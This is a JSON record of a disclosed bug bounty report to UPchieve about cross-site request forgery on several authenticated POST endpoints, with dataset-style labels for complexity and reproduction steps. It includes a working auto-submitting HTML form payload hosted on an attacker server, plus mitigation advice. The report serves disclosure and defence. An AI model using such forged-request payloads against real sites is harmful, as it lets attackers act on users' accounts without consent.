{
    "reported_to": "UPchieve",
    "reported_by": "zeyu2001 ",
    "title": "Widespread CSRF on authenticated POST endpoints",
    "content": "\nSummary:\nCross-Site Request Forgery (CSRF) is possible on most, if not all, authenticated POST endpoints.\nWhile CORS is configured such that the Access-Control-Allow-Origin header is set to Access-Control-Allow-Origin: hackers.upchieve.org, CORS does not prevent CSRF - it only prevents the attacker from reading the response. This does not stop the attacker from performing any arbitrary actions on behalf of the user.\nThis is possible through a simple HTML form with hidden inputs, submitted with JavaScript. While POST requests are made using JSON data by default, application/x-www-form-urlencoded is accepted as well. Because the user's session cookie does not have the SameSite attribute set, it is sent along with the request.\nThe following endpoints were found to be vulnerable:\nPOST /api/calendar/save (set availability for text messages)\nPOST /api/training/score (submit quizzes and subject certifications)\nPOST /auth/reset/send (send password reset email)\nPOST /api/user/volunteer-approval/background-information (submit background information)\nPOST /api/user/volunteer-approval/reference (request a reference)\nThe attacker can perform any of the above actions on behalf of the user, as long as the user has a valid session cookie. There are probably more endpoints to be discovered, but I do not have access to them yet due to the approval / onboarding process.\nPUT requests, particularly PUT /api/user (to update a user's phone number and account status), are not possible through this method. However, older browsers might not comply to CORS pre-flight requests and still allow a PUT request initiated by JavaScript on the attacker's site to go through.\nSteps To Reproduce:\nAs a victim, log in to https://hackers.upchieve.org/\nCreate a page like the one below.\nThis is an example for performing a CSRF on the /api/calendar/save endpoint (the full HTML file is attached). In this example, we set all the possible time slots to \"true\".\nCode 500 Bytes\n1<html>\n2  <body>\n3    <form action=\"https://hackers.upchieve.org/api/calendar/save\" method=\"POST\">\n4        <input type=\"hidden\" name=\"availability[Sunday][12a]\" value=\"true\" />\n5        <input type=\"hidden\" name=\"availability[Sunday][1a]\" value=\"true\" />\n6\t\t\n7\t\t...\n8\t\t\n9        <input type=\"hidden\" name=\"availability[Saturday][11p]\" value=\"true\" />\n10        <input type=\"hidden\" name=\"tz\" value=\"Asia/Singapore\" />\n11    </form>\n12    <script>\n13      \tdocument.forms[0].submit();\n14    </script>\n15  </body>\n16</html>\nServe the page on the attacker server.\nAs the victim, visit http://ATTACKER_SERVER/calendar_csrf.html\nOnce the HTML page loads on the browser, the POST request is submitted and we would see the following response:\nCode 24 Bytes\n1{\"msg\":\"Schedule saved\"}\nVerify that the victim's calendar has been modified.\nI have also prepared other CSRF payloads for the other endpoints.\ncalendar_csrf.html performs the above-described attack.\nreference_csrf.html sends out reference requests on behalf of the victim.\nquiz_csrf.html submits quizzes for grading on behalf of the victim.\nreset_csrf sends out password resets on behalf of the victim.\nSupporting Material/References:\nI have attached the CSRF payloads, a screenshot of the changed calendar, and a screenshot of the output from the quiz CSRF.\nRecommendations for Fixing/Mitigation\nUse CSRF tokens\nUse the SameSite attribute for cookies\nImpact\nWhen an authenticated user visits any attacker-controlled site, the attacker is able to perform arbitrary authenticated actions on behalf of the user. While the attacker cannot obtain the request output from the CSRF, he is still able to perform sensitive actions blindly.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Cross-Site Request Forgery (CSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1644766680,
    "report_url": "https://hackerone.com/reports/1309435",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Log in to https://hackers.upchieve.org/ as a victim"
        ],
        [
            2,
            "Visit a malicious page hosted by the attacker containing a hidden form targeting authenticated POST endpoints"
        ],
        [
            3,
            "The hidden form is automatically submitted via JavaScript, sending authenticated requests to vulnerable endpoints"
        ],
        [
            4,
            "Verify the attacker's actions were executed by checking the victim's account state"
        ]
    ],
    "vuln_description": "Cross-Site Request Forgery (CSRF) vulnerability affecting multiple authenticated POST endpoints due to missing CSRF tokens and SameSite cookie attributes, allowing attackers to perform actions on behalf of authenticated users.",
    "reason": "The vulnerability involves standard CSRF techniques with no complex application state manipulation or novel logic required. The attack follows well-known patterns of exploiting missing CSRF protections.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}